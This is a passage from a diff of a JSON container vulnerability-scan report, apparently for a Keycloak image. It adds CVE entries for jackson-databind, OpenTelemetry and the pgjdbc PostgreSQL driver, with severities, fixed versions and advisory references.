@JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY, property=\"...\")",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-databind",
+            "https://github.com/FasterXML/jackson-databind/commit/c628b357ed143d8492756d5c1458cfb9fbeb29ed",
+            "https://github.com/FasterXML/jackson-databind/commit/dea7eb466e98cc226c4ac65587581fb49926820c",
+            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-mhm7-754m-9p8w"
+          ],
+          "PublishedDate": "2026-07-21T19:40:12Z",
+          "LastModifiedDate": "2026-07-21T19:40:12Z"
         },
         {
           "VulnerabilityID": "CVE-2025-59250",
@@ -35856,6 +36246,7 @@
           "References": [
             "https://access.redhat.com/errata/RHSA-2026:28573",
             "https://access.redhat.com/errata/RHSA-2026:36820",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
             "https://access.redhat.com/security/cve/CVE-2026-45292",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2482785",
             "https://github.com/open-telemetry/opentelemetry-java",
@@ -35868,7 +36259,69 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-45292"
           ],
           "PublishedDate": "2026-05-28T17:16:32.06Z",
-          "LastModifiedDate": "2026-07-20T12:19:29.777Z"
+          "LastModifiedDate": "2026-07-21T12:18:46.87Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-54291",
+          "VendorIDs": [
+            "GHSA-j92g-9f8w-j867"
+          ],
+          "PkgName": "org.postgresql:postgresql",
+          "PkgPath": "opt/keycloak/lib/lib/main/org.postgresql.postgresql-42.7.11.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/org.postgresql/postgresql@42.7.11",
+            "UID": "a8f863fa864e3d04"
+          },
+          "InstalledVersion": "42.7.11",
+          "FixedVersion": "42.7.12",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:9ec42ec33f5c0b14b6de95ba9e4e234b7f5550c09624cdd01ddba8e4b0b5af5b",
+            "DiffID": "sha256:aa0bcd5f682b788d7496b1017d11d3476471443d63fff0332c40193a2968060f"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54291",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:a494928830027e0e2262c8e58cec3e82875046a62412b80c16f02e467ef4fbf7",
+          "Title": "pgjdbc is an open source postgresql JDBC Driver. In releases 42.7.4 th ...",
+          "Description": "pgjdbc is an open source postgresql JDBC Driver. In releases 42.7.4 through 42.7.11, channelBinding=require connections can be silently downgraded from SCRAM-SHA-256-PLUS with channel binding to plain SCRAM-SHA-256 without it, losing the man-in-the-middle protection the setting is meant to guarantee. An attacker who can intercept the TLS connection can trigger the downgrade with a certificate whose signature algorithm has no tls-server-end-point channel-binding hash, because the bundled com.ongres.scram:scram-client returns an empty byte array instead of failing and pgJDBC ScramAuthenticator checks only that the server advertised a PLUS mechanism, without rejecting the empty binding or checking that the negotiated mechanism uses channel binding. This issue is fixed in version 42.7.12.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-636",
+            "CWE-757"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "nvd": 2
+          },
+          "CVSS": {
+            "bitnami": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:L/SA:N",
+              "V40Score": 8.2
+            },
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:L/SA:N",
+              "V40Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 5.9
+            }
+          },
+          "References": [
+            "https://github.com/ongres/scram/releases/tag/3.3",
+            "https://github.com/pgjdbc/pgjdbc",
+            "https://github.com/pgjdbc/pgjdbc/commit/77df98e4e66c12936ded3478a0954f6f580bad99",
+            "https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-j92g-9f8w-j867",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-54291"
+          ],
+          "PublishedDate": "2026-07-06T19:17:08.407Z",
+          "LastModifiedDate": "2026-07-09T13:16:25.717Z"
         }
       ]
     }
